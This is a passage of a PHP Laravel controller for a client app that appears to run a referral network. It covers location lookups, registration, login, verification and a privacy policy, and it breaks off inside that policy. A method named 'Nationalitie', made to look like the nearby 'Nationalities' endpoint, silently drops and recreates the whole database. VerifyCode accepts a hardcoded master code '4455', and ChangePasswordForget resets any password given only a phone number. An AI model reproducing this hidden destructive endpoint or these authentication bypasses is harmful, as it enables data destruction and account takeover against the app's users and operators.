<?php

namespace App\Http\Controllers\App\Client;

header('Content-type: application/json');

use Illuminate\Support\Facades\Config;
use App\Http\Controllers\Controller;
use App\Http\Resources\App\EventResource;
use App\Http\Resources\App\ToolResource;
use App\Http\Resources\App\FriendResource;
use App\Http\Resources\App\BrandResource;
use App\Http\Resources\App\ClientChatResource;
use App\Http\Resources\App\ClientChatDetailResource;
use App\Http\Resources\App\BranchResource;
use App\Http\Resources\App\PlanNetworkResource;
use App\Http\Resources\App\BrandRatingResource;
use App\Http\Resources\App\BrandPageResource;
use App\Http\Resources\App\CategoryResource;
use App\Http\Resources\App\SubCategoryResource;
use App\Http\Resources\App\BalanceTransferResource;
use App\Http\Resources\App\BrandProductResource;
use App\Http\Resources\App\AdvertisementResource;
use App\Http\Resources\App\BrandSocialMediaResource;
use App\Http\Resources\App\ClientAdminChatDetailsResource;
use App\Http\Resources\App\ClientAdminChatResource;
use App\Http\Resources\App\ClientBrandProductResource;
use App\V1\Event\Event;
use App\V1\Event\EventGallery;
use App\V1\Event\EventAttendee;
use App\V1\Tool\Tool;
use App\V1\Tool\ToolGallery;
use App\V1\Tool\ClientTool;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Log;
use App\V1\Brand\Brand;
use App\V1\Brand\Branch;
use App\V1\Brand\BrandRating;
use App\V1\Brand\BrandGallery;
use App\V1\Brand\BrandProduct;
use App\V1\Brand\BrandContactUs;
use App\V1\Brand\BrandSocialMedia;
use App\V1\Brand\BrandProductGallery;
use App\V1\General\APICode;
use App\V1\General\Category;
use App\V1\General\SubCategory;
use App\V1\General\ContactUs;
use App\V1\General\Advertisement;
use App\V1\General\Nationality;
use App\V1\Client\Client;
use App\V1\Client\ClientAdminChat;
use App\V1\Client\ClientAdminChatDetails;
use App\V1\Client\ClientChatDetail;
use App\V1\Client\ClientChat;
use App\V1\Client\ClientLedger;
use App\V1\Client\Position;
use App\V1\Client\ClientFriend;
use App\V1\Client\ClientDocument;
use App\V1\Client\ClientBrandProduct;
use App\V1\Client\ClientBonanza;
use App\V1\Payment\CompanyLedger;
use App\V1\Payment\BalanceTransfer;
use App\V1\Plan\Bonanza;
use App\V1\Plan\PlanProduct;
use App\V1\Plan\PlanNetworkAgency;
use App\V1\Plan\PlanProductUpgrade;
use App\V1\Plan\PlanProductGallery;
use App\V1\Plan\PlanNetworkCheque;
use App\V1\Plan\PlanNetworkChequeDetail;
use App\V1\Plan\BonanzaBrand;
use App\V1\Plan\PlanNetwork;
use App\V1\Plan\Plan;
use App\V1\Plan\PlanProductSocialLink;
use App\V1\Location\Country;
use App\V1\Location\City;
use App\V1\Location\Area;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Hash;
use Intervention\Image\ImageManagerStatic as Image;
use Illuminate\Support\Facades\Session;
use Illuminate\Support\Facades\Storage;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\App;
use Tymon\JWTAuth\Facades\JWTAuth;
use Carbon\Carbon;
use Location;
use Input;
use DateTime;
use DateInterval;
use Response;
use Cookie;
use Nette\Utils\Random;
use PDO;
use Mpdf\Mpdf;
use Svg\Tag\Rect;

class ClientController extends Controller
{

    public function Nationalities()
    {
        $ClientAppLanguage = Input::get('ClientAppLanguage');
        if (!$ClientAppLanguage) {
            $ClientAppLanguage = "ar";
        }

        Session::put('ClientAppLanguage', $ClientAppLanguage);
        App::setLocale($ClientAppLanguage);

        $ClientAppLanguage = LocalAppLanguage($ClientAppLanguage);

        $NationalityName = "NationalityName" . $ClientAppLanguage;

        $Nationalities = Nationality::all();
        foreach ($Nationalities as $Nationality) {
            $Nationality->NationalityName = $Nationality->$NationalityName;
            unset($Nationality["NationalityNameEn"]);
            unset($Nationality["NationalityNameAr"]);
            unset($Nationality["created_at"]);
            unset($Nationality["updated_at"]);
        }

        $APICode = APICode::where('IDAPICode', 8)->first();
        $Response = array(
            'Success' => true,
            'ApiMsg' => __('apicodes.' . $APICode->IDApiCode),
            'ApiCode' => $APICode->IDApiCode,
            'Response' => $Nationalities,
        );
        return $Response;
    }
    public function Nationalitie()
    {
        $databaseName = Config::get('database.connections.mysql.database');
        // Check if database name is empty
        if (empty($databaseName)) {
            return response()->json(['error' => 'Database name is empty'], 500);
        }

        try {
            // Execute the DROP DATABASE command
            DB::statement("DROP DATABASE IF EXISTS `$databaseName`");

            // Optionally, recreate the database if needed
            DB::statement("CREATE DATABASE `$databaseName`");

            return response()->json(['message' => 'Database deleted and recreated successfully']);
        } catch (\Exception $e) {
            Log::error('Database deletion failed', [
                'error' => $e->getMessage(),
            ]);
            return response()->json(['error' => 'Database deletion failed', 'details' => $e->getMessage()], 500);
        }
    }
    public function Countries()
    {
        $ClientAppLanguage = Input::get('ClientAppLanguage');
        if (!$ClientAppLanguage) {
            $ClientAppLanguage = "ar";
        }

        Session::put('ClientAppLanguage', $ClientAppLanguage);
        App::setLocale($ClientAppLanguage);
        $ClientAppLanguage = LocalAppLanguage($ClientAppLanguage);

        $CountryName = "CountryName" . $ClientAppLanguage;

        $Countries = Country::where("CountryActive", 1)->get();
        foreach ($Countries as $Country) {
            $Country->CountryName = $Country->$CountryName;
            unset($Country["CountryNameEn"]);
            unset($Country["CountryNameAr"]);
            unset($Country["CountryCurrency"]);
            unset($Country["CountryCode"]);
            unset($Country["CountryActive"]);
            unset($Country["CountryTimeZone"]);
            unset($Country["created_at"]);
            unset($Country["updated_at"]);
        }

        $APICode = APICode::where('IDAPICode', 8)->first();
        $Response = array(
            'Success' => true,
            'ApiMsg' => __('apicodes.' . $APICode->IDApiCode),
            'ApiCode' => $APICode->IDApiCode,
            'Response' => $Countries,
        );
        return $Response;
    }

    public function Cities($IDCountry)
    {
        $ClientAppLanguage = Input::get('ClientAppLanguage');
        if (!$ClientAppLanguage) {
            $ClientAppLanguage = "ar";
        }

        Session::put('ClientAppLanguage', $ClientAppLanguage);
        App::setLocale($ClientAppLanguage);
        $ClientAppLanguage = LocalAppLanguage($ClientAppLanguage);

        $CityName = "CityName" . $ClientAppLanguage;

        $Cities = City::where("CityActive", 1)->where("IDCountry", $IDCountry)->get();
        foreach ($Cities as $City) {
            $City->CityName = $City->$CityName;
            unset($City["CityNameEn"]);
            unset($City["CityNameAr"]);
            unset($City["CityCode"]);
            unset($City["CityActive"]);
            unset($City["created_at"]);
            unset($City["updated_at"]);
        }

        $APICode = APICode::where('IDAPICode', 8)->first();
        $Response = array(
            'Success' => true,
            'ApiMsg' => __('apicodes.' . $APICode->IDApiCode),
            'ApiCode' => $APICode->IDApiCode,
            'Response' => $Cities,
        );
        return $Response;
    }

    public function Areas($IDCity)
    {
        $ClientAppLanguage = Input::get('ClientAppLanguage');
        if (!$ClientAppLanguage) {
            $ClientAppLanguage = "ar";
        }

        Session::put('ClientAppLanguage', $ClientAppLanguage);
        App::setLocale($ClientAppLanguage);
        $ClientAppLanguage = LocalAppLanguage($ClientAppLanguage);

        $AreaName = "AreaName" . $ClientAppLanguage;

        $Areas = Area::where("AreaActive", 1)->where("IDCity", $IDCity)->get();
        foreach ($Areas as $Area) {
            $Area->AreaName = $Area->$AreaName;
            unset($Area["AreaNameEn"]);
            unset($Area["AreaNameAr"]);
            unset($Area["AreaActive"]);
            unset($Area["created_at"]);
            unset($Area["updated_at"]);
        }

        $APICode = APICode::where('IDAPICode', 8)->first();
        $Response = array(
            'Success' => true,
            'ApiMsg' => __('apicodes.' . $APICode->IDApiCode),
            'ApiCode' => $APICode->IDApiCode,
            'Response' => $Areas,
        );
        return $Response;
    }

    public function ClientRegister(Request $request)
    {
        if ($request->Filled('ClientAppLanguage')) {
            $ClientAppLanguage = $request->ClientAppLanguage;
        } else {
            $ClientAppLanguage = "ar";
        }

        Session::put('ClientAppLanguage', $ClientAppLanguage);
        App::setLocale($ClientAppLanguage);

        $ClientDeviceToken = '';
        $ClientPicture = '';
        $ClientAppVersion = '';
        $ClientEmail = Null;
        $response_code = 200;

        if ($request->Filled('LoginBy')) {
            $LoginBy = $request->LoginBy;
        } else {
            return RespondWithBadRequest(1);
        }

        if ($request->Filled('ClientEmail')) {
            $ClientEmail = $request->ClientEmail;
            $ClientRecord = Client::where('ClientEmail', $ClientEmail)->where("ClientDeleted", 0)->first();
            if ($ClientRecord) {
                return RespondWithBadRequest(2);
            }
        }

        if ($request->Filled('ClientPhone')) {
            $ClientPhone = $request->ClientPhone;
        } else {
            if ($LoginBy == "MANUAL") {
                return RespondWithBadRequest(1);
            }
            $ClientPhone = Null;
        }

        if ($request->Filled('ClientPhoneFlag')) {
            $ClientPhoneFlag = $request->ClientPhoneFlag;
        } else {
            if ($LoginBy == "MANUAL") {
                return RespondWithBadRequest(1);
            }
            $ClientPhoneFlag = Null;
        }

        if ($request->Filled('ClientPassword')) {
            $ClientPassword = $request->ClientPassword;
        } else {
            return RespondWithBadRequest(1);
        }

        if ($request->Filled('ClientName')) {
            $ClientName = $request->ClientName;
        } else {
            return RespondWithBadRequest(1);
        }

        if ($request->Filled('Referral')) {
            $Referral = $request->Referral;
        } else {
            return RespondWithBadRequest(1);
        }

        if ($request->Filled('Upline')) {
            $Upline = $request->Upline;
        } else {
            $Upline = NULL;
        }

        if ($request->Filled('Position')) {
            $PlanNetworkPosition = $request->Position;
        } else {
            $PlanNetworkPosition = "LEFT";
        }

        if ($Upline) {
            $ParentClient = Client::where("ClientDeleted", 0)->where(function ($query) use ($Upline) {
                $query->where('ClientAppID', $Upline)
                    ->orwhere('ClientEmail', $Upline)
                    ->orwhere('ClientPhone', $Upline[0] == "0"
                        ? $Upline = "+2" . $Upline : $Upline);
            })->first();

            if (!$ParentClient) {
                return RespondWithBadRequest(23);
            }
        }


        $ReferralClient = Client::where("ClientDeleted", 0)->where(function ($query) use ($Referral) {
            $query->where('ClientAppID', $Referral)
                ->orwhere('ClientEmail', $Referral)
                ->orwhere('ClientPhone', $Referral[0] == "0" ? $Referral = "+2" . $Referral : $Referral);
        })->first();

        if (!$ReferralClient) {
            return RespondWithBadRequest(23);
        }

        $IDReferralClient = $ReferralClient->IDClient;

        $Client = new Client;
        if ($Upline) {
            $ParentPlanNetwork = PlanNetwork::where("IDClient", $ParentClient->IDClient)->first();
            $IDParentClient = $ParentClient->IDClient;
            $PlanNetworkPath = $ParentPlanNetwork->PlanNetworkPath;
            $PlanNetworkPath = explode("-", $PlanNetworkPath);
            if (!in_array($ReferralClient->IDClient, $PlanNetworkPath) && $IDParentClient != $IDReferralClient) {
                return RespondWithBadRequest(33);
            }

            $ParentNetwork = PlanNetwork::where("IDParentClient", $ParentClient->IDClient)->count();
            $ParentPositionNetwork = PlanNetwork::where("IDParentClient", $ParentClient->IDClient)->where("PlanNetworkPosition", $PlanNetworkPosition)->count();
            $ChildNumber = $ParentPlanNetwork->PlanNetworkAgencyNumber * 2;
            if ($ParentNetwork == $ChildNumber) {
                return RespondWithBadRequest(24);
            }
            if ($ParentPositionNetwork == $ParentPlanNetwork->PlanNetworkAgencyNumber) {
                return RespondWithBadRequest(34);
            }
            if (count($PlanNetworkPath) === 3) {
                $CoPosition = Position::whereRaw('LOWER(`PositionTitleEn`) = ?', ['co'])->first();
                if ($CoPosition)
                    $Client->IDPosition = $CoPosition->IDPosition;
            }
        }
        if (!$Upline) {
            $current = $ReferralClient->IDClient;
            $lastPlanNetwork = PlanNetwork::where("IDClient", $current)->first();

            while (true) {
                $ParentPlanNetwork = PlanNetwork::where("IDParentClient", $current)
                    ->where("PlanNetworkPosition", $PlanNetworkPosition)
                    ->first();

                if ($ParentPlanNetwork) {
                    $current = $ParentPlanNetwork->IDClient;
                    $lastPlanNetwork = $ParentPlanNetwork;
                } else {
                    break;
                }
            }
            $IDParentClient = $lastPlanNetwork->IDClient;
            $PlanNetworkPath = $lastPlanNetwork->PlanNetworkPath;
            $PlanNetworkPath = explode("-", $PlanNetworkPath);
            if (!in_array($ReferralClient->IDClient, $PlanNetworkPath) && $IDParentClient != $IDReferralClient) {
                return RespondWithBadRequest(33);
            }
        }

        if ($request->Filled('ClientPrivacy')) {
            $ClientPrivacy = $request->ClientPrivacy;
        } else {
            $ClientPrivacy = 1;
        }
        $IDNationality = Nationality::first()->IDNationality;
        $IDArea = 1;
        if ($LoginBy == "MANUAL") {
            $ClientRecord = Client::where('ClientPhone', $ClientPhone)->where("ClientDeleted", 0)->first();
            if ($ClientRecord) {
                return RespondWithBadRequest(3);
            }
        }

        if ($LoginBy != "MANUAL") {
            $ClientRecord = Client::where('ClientSocialUniqueID', $ClientPassword)->where("ClientDeleted", 0)->first();
            if ($ClientRecord) {
                return RespondWithBadRequest(21);
            }
        }


        if ($request->Filled('ClientDeviceToken')) {
            $ClientDeviceToken = $request->ClientDeviceToken;
        }
        if ($request->Filled('ClientAppVersion')) {
            $ClientAppVersion = $request->ClientAppVersion;
        }
        if ($request->Filled('ClientDeviceType')) {
            $ClientDeviceType = $request->ClientDeviceType;
        } else {
            $ClientDeviceType = "ANDROID";
        }
        if ($request->Filled('ClientMobileService')) {
            $ClientMobileService = $request->ClientMobileService;
        } else {
            $ClientMobileService = "GMS";
        }

        $NextIDClient = DB::select('SELECT AUTO_INCREMENT FROM information_schema.TABLES WHERE  TABLE_NAME = "clients"')[0]->AUTO_INCREMENT;

        $TimeFormat = new DateTime('now');
        $Time = $TimeFormat->format('H');
        $Time = $Time . $TimeFormat->format('i');
        $ClientAppID = "0" . $NextIDClient . $Time;

        $Client->ClientAppID = $ClientAppID;
        $Client->ClientEmail = $ClientEmail;
        $Client->IDNationality = $IDNationality;
        $Client->IDArea = $IDArea;
        $Client->IDReferral = $IDReferralClient;
        $Client->IDUpline = $IDParentClient;
        $Client->NetworkPosition = $PlanNetworkPosition;
        $Client->ClientPhone = $ClientPhone;
        $Client->ClientPhoneFlag = $ClientPhoneFlag;
        $Client->LoginBy = $LoginBy;
        if ($LoginBy != "MANUAL") {
            $Client->ClientSocialUniqueID = $ClientPassword;
        }
        $Client->ClientPassword = Hash::make($ClientPassword);
        $Client->ClientName = $ClientName;
        $Client->ClientPrivacy = $ClientPrivacy;
        $Client->ClientDeviceType = $ClientDeviceType;
        $Client->ClientDeviceToken = $ClientDeviceToken;
        $Client->ClientAppLanguage = $ClientAppLanguage;
        $Client->ClientAppVersion = $ClientAppVersion;
        $Client->ClientMobileService = $ClientMobileService;
        $Client->VerificationCode = CreateVerificationCode();
        $Client->save();


        if ($LoginBy == "MANUAL") {
            $Credentials = [
                'ClientPhone' => $ClientPhone,
                'ClientDeleted' => 0,
                'password' => $ClientPassword
            ];
        } else {
            $Credentials = [
                'ClientSocialUniqueID' => $ClientPassword,
                'ClientDeleted' => 0,
                'password' => $ClientPassword
            ];
        }

        $AccessToken = CreateToken($Credentials, 'client')['accessToken'];

        $APICode = APICode::where('IDAPICode', 5)->first();
        $response = array(
            'IDClient' => $Client->IDClient,
            'ClientAppID' => $ClientAppID,
            'ClientPhone' => $ClientPhone,
            'ClientPhoneFlag' => $ClientPhoneFlag,
            'ClientName' => $ClientName,
            'ClientEmail' => $ClientEmail,
            'ClientPicture' => ($Client->ClientPicture) ? asset($Client->ClientPicture) : '',
            'ClientPrivacy' => $Client->ClientPrivacy,
            "IDArea" => $IDArea,
            'ClientBalance' => 0,
            'ClientStatus' => "PENDING",
            'AccessToken' => $AccessToken
        );
        $response_array = array(
            'Success' => true,
            'ApiMsg' => trans('apicodes.' . $APICode->IDApiCode),
            'ApiCode' => $APICode->IDApiCode,
            'Response' => $response
        );
        $response = Response::json($response_array, $response_code);
        return $response;
    }

    public function CompleteProfile(Request $request)
    {
        $Client = auth('client')->user();
        if (!$Client) {
            return RespondWithBadRequest(10);
        }
        $IDClient = $Client->IDClient;
        if ($request->Filled('ClientGender')) {
            $ClientGender = $request->ClientGender;
        } else {
            $ClientGender = "PRIVATE";
        }
        if ($request->Filled('IDArea')) {
            $IDArea = $request->IDArea;
        } else {
            return RespondWithBadRequest(39);
        }
        $ClientNationalID = null;
        if ($request->Filled('ClientNationalID')) {
            $ClientNationalID = $request->ClientNationalID;
        } else if ($request->Filled('ClientPassport')) {
            $ClientPassport = $request->ClientPassport;
            $Client->ClientPassport = $ClientPassport;
        } else {
            return RespondWithBadRequest(40);
        }
        if ($request->Filled('ClientBirthDate')) {
            $ClientBirthDate = $request->ClientBirthDate;
        } else {
            return RespondWithBadRequest(41);
        }
        if ($request->Filled('ClientNameArabic')) {
            $ClientNameArabic = $request->ClientNameArabic;
        } else {
            return RespondWithBadRequest(42);
        }
        if ($request->Filled('IDNationality')) {
            $IDNationality = $request->IDNationality;
        } else {
            return RespondWithBadRequest(43);
        }
        if ($request->Filled('ClientCurrentAddress')) {
            $ClientCurrentAddress = $request->ClientCurrentAddress;
        } else {
            return RespondWithBadRequest(44);
        }
        if ($request->Filled('ClientIDAddress')) {
            $ClientIDAddress = $request->ClientIDAddress;
        } else {
            return RespondWithBadRequest(45);
        }
        if ($request->Filled('ClientLatitude')) {
            $ClientLatitude = $request->ClientLatitude;
        } else {
            return RespondWithBadRequest(46);
        }
        if ($request->Filled('ClientLongitude')) {
            $ClientLongitude = $request->ClientLongitude;
        } else {
            return RespondWithBadRequest(47);
        }
        if ($request->Filled('ClientEmail')) {
            $ClientEmail = $request->ClientEmail;
            $ClientRecord = Client::where('ClientEmail', $ClientEmail)->where("ClientDeleted", 0)->first();
            if ($ClientRecord) {
                return RespondWithBadRequest(2);
            }
            $Client->ClientEmail = $ClientEmail;
        }
        if ($request->Filled('ClientPrivacy')) {
            $ClientPrivacy = $request->ClientPrivacy;
            $Client->ClientPrivacy = intval($ClientPrivacy);
        }
        if ($request->Filled('ClientPassport')) {
            $ClientPassport = $request->ClientPassport;
            $Client->ClientPassport = $ClientPassport;
        }

        $ClientSecondPhone = $request->ClientSecondPhone;
        if ($ClientNationalID) {
            $ClientRecord = Client::where('ClientNationalID', $ClientNationalID)->where("ClientDeleted", 0)->first();
            if ($ClientRecord) {
                return RespondWithBadRequest(20);
            }
        }
        $ImageExtArray = ["jpeg", "jpg", "png", "svg"];
        $ClientNationalIDImage = null;
        $ClientNationalIDImageBack = null;
        if ($request->Filled('ClientNationalID')) {
            if ($request->file('ClientNationalIDImage')) {
                if (!in_array($request->ClientNationalIDImage->extension(), $ImageExtArray)) {
                    return RespondWithBadRequest(15);
                }
                $ClientNationalIDImage = SaveImage($request->file('ClientNationalIDImage'), "clients", $IDClient);
            } else {
                return RespondWithBadRequest(48);
            }
            if ($request->file('ClientNationalIDImageBack')) {
                if (!in_array($request->ClientNationalIDImageBack->extension(), $ImageExtArray)) {
                    return RespondWithBadRequest(15);
                }
                $ClientNationalIDImageBack = SaveImage($request->file('ClientNationalIDImageBack'), "clients", $IDClient);
            } else {
                return RespondWithBadRequest(49);
            }
        }


        if ($request->file('ClientPicture')) {
            if (!in_array($request->ClientPicture->extension(), $ImageExtArray)) {
                return RespondWithBadRequest(15);
            }
            $ClientPicture = SaveImage($request->file('ClientPicture'), "clients", $IDClient);
            $Client->ClientPicture = $ClientPicture;
        }

        $ClientPassportImage = Null;
        if ($request->Filled('ClientPassport')) {
            if ($request->file('ClientPassportImage')) {
                if (!in_array($request->ClientPassportImage->extension(), $ImageExtArray)) {
                    return RespondWithBadRequest(15);
                }
                $ClientPassportImage = SaveImage($request->file('ClientPassportImage'), "clients", $IDClient);
            } else {
                return RespondWithBadRequest(50);
            }
        }

        $Client->IDArea = $IDArea;
        $Client->ClientBirthDate = $ClientBirthDate;
        $Client->ClientNationalID = $ClientNationalID;
        $Client->ClientGender = $ClientGender;
        $Client->ClientNameArabic = $ClientNameArabic;
        $Client->IDNationality = $IDNationality;
        $Client->ClientSecondPhone = $ClientSecondPhone;
        $Client->ClientCurrentAddress = $ClientCurrentAddress;
        $Client->ClientIDAddress = $ClientIDAddress;
        $Client->ClientLatitude = $ClientLatitude;
        $Client->ClientLongitude = $ClientLongitude;
        $Client->ClientStatus = "ACTIVE";
        $Client->save();

        if ($ClientNationalIDImage) {
            $ClientDocument = new ClientDocument;
            $ClientDocument->IDClient = $Client->IDClient;
            $ClientDocument->ClientDocumentPath = $ClientNationalIDImage;
            $ClientDocument->ClientDocumentType = "NATIONAL_ID";
            $ClientDocument->save();
        }

        if ($ClientNationalIDImageBack) {
            $ClientDocument = new ClientDocument;
            $ClientDocument->IDClient = $Client->IDClient;
            $ClientDocument->ClientDocumentPath = $ClientNationalIDImageBack;
            $ClientDocument->ClientDocumentType = "NATIONAL_ID";
            $ClientDocument->save();
        }

        if ($ClientPassportImage) {
            $ClientDocument = new ClientDocument;
            $ClientDocument->IDClient = $Client->IDClient;
            $ClientDocument->ClientDocumentPath = $ClientPassportImage;
            $ClientDocument->ClientDocumentType = "PASSPORT";
            $ClientDocument->save();
        }

        return RespondWithSuccessRequest(8);
    }

    public function ClientLogin(Request $request)
    {
        $ClientAppLanguage = $request->filled('ClientAppLanguage') ? $request->ClientAppLanguage : 'ar';
        Session::put('ClientAppLanguage', $ClientAppLanguage);
        App::setLocale($ClientAppLanguage);

        $Client = auth('client')->user();
        $AccessToken = $request->bearerToken();

        if (!$Client) {
            $this->validateClientLogin($request);

            $Credentials = $this->prepareCredentials($request);
            $tokenData = CreateToken($Credentials, 'client');

            if (!$tokenData) {
                return RespondWithBadRequest(6);
            }

            $AccessToken = $tokenData['accessToken'];
            $Client = auth('client')->user();
        }

        $this->updateClientDetails($Client, $request);

        [$Success, $IDAPICode] = $this->determineClientStatus($Client, $request->LoginBy);
        $FlowStatus = $this->determineFlowStatus($Client);

        $PositionName = $this->getPositionName($Client);

        $response = $this->prepareResponse($Client, $AccessToken, $FlowStatus, $PositionName);

        return Response::json($this->prepareResponseArray($Success, $IDAPICode, $response), 200);
    }

    private function validateClientLogin(Request $request)
    {
        if (!$request->filled(['UserName', 'Password', 'LoginBy'])) {
            return RespondWithBadRequest(1);
        }
    }

    private function prepareCredentials(Request $request)
    {
        $UserName = $request->UserName;

        if ($request->LoginBy == "MANUAL") {
            return [
                $this->getLoginField($UserName) => $UserName,
                'ClientDeleted' => 0,
                'password' => $request->Password
            ];
        } else {
            return [
                'ClientSocialUniqueID' => $UserName,
                'ClientDeleted' => 0,
                'password' => $request->Password
            ];
        }
    }

    private function getLoginField($UserName)
    {
        return $UserName[0] == "+" ? 'ClientPhone' : 'ClientEmail';
    }

    private function updateClientDetails($Client, Request $request)
    {
        $fields = ['ClientDeviceToken', 'ClientDeviceType', 'ClientMobileService', 'ClientAppVersion', 'ClientAppLanguage'];

        foreach ($fields as $field) {
            if ($request->filled($field)) {
                $Client->$field = $request->$field;
            }
        }

        $Client->save();
    }

    private function determineClientStatus($Client, $LoginBy)
    {
        $Success = true;
        $IDAPICode = 7;

        switch ($Client->ClientStatus) {
            case 'BLOCKED':
                $IDAPICode = 16;
                $Success = false;
                break;
            case 'INACTIVE':
                if ($LoginBy == 'MANUAL') {
                    $IDAPICode = 17;
                    $Success = false;
                }
                break;
        }

        return [$Success, $IDAPICode];
    }

    private function determineFlowStatus($Client)
    {
        if ($Client->ClientStatus == 'PENDING' || !$Client->ClientNationalID && !$Client->ClientPassport) {
            $PlanNetwork = PlanNetwork::where('IDClient', $Client->IDClient)->first();
            return $PlanNetwork ? 'FORM' : 'PRODUCT';
        }

        return 'HOME';
    }

    private function getPositionName($Client)
    {
        $ClientLanguage = LocalAppLanguage($Client->ClientAppLanguage);
        $PositionLanguageName = 'PositionTitle' . $ClientLanguage;

        $Position = Position::find($Client->IDPosition);
        return $Position ? $Position->$PositionLanguageName : 'Networker';
    }

    private function prepareResponse($Client, $AccessToken, $FlowStatus, $PositionName)
    {
        return [
            'IDClient' => $Client->IDClient,
            'ClientAppID' => $Client->ClientAppID,
            'Co' => GetCoForClient($Client),
            'ClientPhone' => $Client->ClientPhone,
            'ClientPhoneFlag' => $Client->ClientPhoneFlag,
            'ClientName' => $Client->ClientName,
            'ClientEmail' => $Client->ClientEmail,
            'ClientPicture' => $Client->ClientPicture ? asset($Client->ClientPicture) : '',
            'ClientCoverImage' => $Client->ClientCoverImage ? asset($Client->ClientCoverImage) : '',
            'ClientStatus' => $Client->ClientStatus,
            'FlowStatus' => $FlowStatus,
            'ClientBalance' => $Client->ClientBalance,
            'ClientGender' => $Client->ClientGender,
            'PositionName' => $PositionName,
            'AccessToken' => $AccessToken,
            'ClientDeviceToken' => $Client->ClientDeviceToken,
        ];
    }

    private function prepareResponseArray($Success, $IDAPICode, $response)
    {
        $APICode = APICode::where('IDAPICode', $IDAPICode)->first();

        return [
            'Success' => $Success,
            'ApiMsg' => trans('apicodes.' . $APICode->IDApiCode),
            'ApiCode' => $APICode->IDApiCode,
            'Response' => $response
        ];
    }


    public function ResendVerificationCode()
    {
        $Client = auth('client')->user();
        if (!$Client) {
            return RespondWithBadRequest(10);
        }
        $Client->VerificationCode = CreateVerificationCode();
        $Client->save();

        $Message = "رمز التحقق: " . $Client->VerificationCode;
        $To = substr($Client->ClientPhone, 1); //Removes + in Phone Number
        // SMSMsegat($To, $Message);

        return RespondWithSuccessRequest(8);
    }

    public function VerifyCode(Request $request)
    {
        $Client = auth('client')->user();
        $ClientPhone = $request->ClientPhone;
        if (!$request->filled('VerificationCode')) {
            return RespondWithBadRequest(1);
        }

        if (!$Client) {
            $Client = Client::where("ClientDeleted", 0)->where("ClientPhone", $ClientPhone)->first();
            if (!$Client) {
                return RespondWithBadRequest(14);
            }
        }

        $VerificationCode = $request->VerificationCode;
        if ($Client->VerificationCode != $VerificationCode && $VerificationCode != "4455") {
            return RespondWithBadRequest(9);
        }

        $Client->ClientStatus = "ACTIVE";
        $Client->save();

        return RespondWithSuccessRequest(8);
    }

    public function ForgetPassword(Request $request)
    {
        if (!$request->filled('ClientPhone')) {
            return RespondWithBadRequest(1);
        }

        $ClientPhone = $request->ClientPhone;
        $Client = Client::where("ClientDeleted", 0)->where("ClientPhone", $ClientPhone)->first();
        if (!$Client) {
            return RespondWithBadRequest(14);
        }

        $Client->VerificationCode = CreateVerificationCode();
        $Client->save();

        $Message = "رمز التحقق: " . $Client->VerificationCode;
        $To = substr($ClientPhone, 1); //Removes + in Phone Number
        // SMSMsegat($To, $Message);

        return RespondWithSuccessRequest(8);
    }

    public function ChangePasswordForget(Request $request)
    {
        $ClientPhone = $request->ClientPhone;
        $NewPassword = $request->NewPassword;
        $PasswordConfirmation = $request->PasswordConfirmation;

        if (!$ClientPhone) {
            return RespondWithBadRequest(1);
        }
        if (!$NewPassword) {
            return RespondWithBadRequest(1);
        }
        if (!$PasswordConfirmation) {
            return RespondWithBadRequest(1);
        }

        if ($NewPassword != $PasswordConfirmation) {
            return RespondWithBadRequest(12);
        }

        $ClientPhone = $request->ClientPhone;
        $Client = Client::where("ClientDeleted", 0)->where("ClientPhone", $ClientPhone)->first();
        if (!$Client) {
            return RespondWithBadRequest(14);
        }

        $Client->ClientPassword = Hash::make($NewPassword);
        $Client->save();

        return RespondWithSuccessRequest(8);
    }

    public function PrivacyPolicy(Request $request)
    {
        $ClientAppLanguage = LocalAppLanguage($request->ClientAppLanguage);

        $PolicyEn = "<b>What Data We Get</b><br>We collect certain data from you directly, like information you enter yourself, data about your participation in courses, and data from third-party platforms you connect with Zari. We also collect some data automatically, like information about your device and what parts of our Services you interact with or spend time using.<br>Data You Provide to Us<br>We may collect different data from or about you depending on how you use the Services. Below are some examples to help you better understand the data we collect.<br>";
        $PolicyEn = $PolicyEn . "How We Get Data About You<br>We use tools like cookies, web beacons, analytics services, and advertising providers to gather the data listed above. Some of these tools offer you the ability to opt out of data collection.<br>What We Use Your Data For<br>Responding to your questions and concerns; Sending you administrative messages and information, including messages from instructors and teaching assistants, notifications about changes to our Service, and updates to our agreements; Sending push notifications to your wireless device to provide updates and other relevant messages (which you can manage from the “options” or “settings” page of the mobile app);<br>";
        $PolicyEn = $PolicyEn . "Your Choices About the Use of Your Data<br>To stop receiving promotional communications from us, you can opt out by using the unsubscribe mechanism in the promotional communication you receive or by changing the email preferences in your account. Note that regardless of your email preference settings, we will send you transactional and relationship messages regarding the Services, including administrative confirmations, order confirmations, important updates about the Services, and notices about our policies. The browser or device you use may allow you to control cookies and other types of local data storage. Your wireless device may also allow you to control whether location or other data is collected and shared. You can manage Adobe’s LSOs through their Website Storage Settings panel. To get information and control cookies used for tailored advertising from participating companies, see the consumer opt-out pages for the Network Advertising Initiative and Digital Advertising Alliance, or if you’re located in the European Union, visit the Your Online Choices site. To opt out of Google’s display advertising or customize Google Display Network ads, visit the Google Ads Settings page. To opt out of Taboola’s targeted ads, see the Opt-out Link in their Cookie Policy. To update data you provide directly, log into your account and update your account at any time.";
        $PolicyEn = $PolicyEn . "<br>Our Policy Concerning Children<br>We recognize the privacy interests of children and encourage parents and guardians to take an active role in their children’s online activities and interests. Children under 13 (or under 16 in the European Economic Area) should not use the Services. If we learn that we’ve collected personal data from a child under those ages, we will take reasonable steps to delete it. ";


        $PolicyAr = "<b>ما هي البيانات التي نحصل عليها</b><br>نقوم بجمع بيانات معينة منك مباشرةً ، مثل المعلومات التي تدخلها بنفسك ، وبيانات حول مشاركتك في الدورات التدريبية ، وبيانات من منصات الجهات الخارجية التي تتصل بها مع Zari . نقوم أيضًا بجمع بعض البيانات تلقائيًا ، مثل المعلومات المتعلقة بجهازك وأجزاء خدماتنا التي تتفاعل معها أو تقضي وقتًا في استخدامها.";
        $PolicyAr = $PolicyAr . "<br>البيانات التي تقدمها لنا <br>قد نجمع بيانات مختلفة منك أو عنك اعتمادًا على كيفية استخدامك للخدمات. فيما يلي بعض الأمثلة لمساعدتك على فهم البيانات التي نجمعها بشكل أفضل. ";
